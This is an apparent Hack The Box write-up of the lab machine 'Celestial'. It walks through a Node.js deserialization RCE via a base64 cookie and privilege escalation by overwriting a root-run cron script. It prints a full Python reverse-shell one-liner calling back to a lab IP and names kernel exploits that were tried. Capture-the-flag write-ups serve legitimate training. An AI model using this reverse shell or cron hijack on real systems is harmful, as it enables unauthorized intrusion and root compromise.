---
title: "Celestial - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - medium
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Celestial
![](https://kar0nx.github.io/assets/images/writeup/9285640b526bf29343d8ca1a4ec778a2.png)
## Reconnaissance

IP: 10.10.10.85
## NMAP

```
nmap -T4 -p- -A 10.10.10.85
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 19:19 UTC
Nmap scan report for 10.10.10.85
Host is up (0.026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   25.34 ms 10.10.14.1
2   25.42 ms 10.10.10.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.34 seconds
```

Only port 3000 open with http service

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919162510.png)

Ok, we see that this isn't 404 site we have status code is 200, tried directory busting without results, also big list so let's check it burp

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919162714.png)

what we see in burp x-powered-by express is interesting also cookie looks suspicious 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919162918.png)

correct! we have encoded account in base64
Now I stuck, never deal with sth like that in 0xdf writeup I found interesting post:
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

## Gaining Access

So writing this we deal with CVE-2017-5941 deserialization bug for RCE
We can create payload via nodejsshell.py
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

```
python2 es.py 10.10.14.13 443
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919163730.png)

You can also watch this YT 4min video 
https://www.youtube.com/watch?v=GFacPoWOcw0
If you don't have nodejs module node-serialize I will give you quick installation 

```
npm init -y
npm install node-serialize --save
```

and then run adding payload before

```
nodejs exploit.js
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919171023.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919171515.png)

before encoding to base64 remember to add () at the very end 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919171616.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919171743.png)

now go to burp, set listener, paste payload and run

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919171802.png)

We got reverse shell as sun user, upgrade to TTY shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now take user.txt

## Privilege Escalation

Running linpeas we got some good outputs

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919172135.png)

Pkexec

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919172540.png)

New files modified in last 5min, need to check it with pspy

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919172707.png)

Ok mamy vectors we can get root access via pwnkit (I think we can use more kernel exploits, box was created march 2018)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919172921.png)

but this is old machine and it won't be the proper way to pwn it,
but before moving on I wanted to try race condition priv esc cve-2016-8655 but didn't work

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919173754.png)

Ok, let's back and gain root access proper way, as I spot in linpeas we need to run pspy to check what runs cron and generating files. get pspy32 on machine and run

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919174555.png)

Cron is running every 5min
/home/sun/Documents/script.py
Ok, file runs with root privileges, let's check content and permission to this script 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919174952.png)

### Hijacking Cron

We see that we can overwrite this file
go to https://www.revshells.com/ and create python rev shell

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

now mv or rm existing script.py and download your reverse shell 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919180548.png)

Wait max to 5min and we got a root shell.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919180654.png)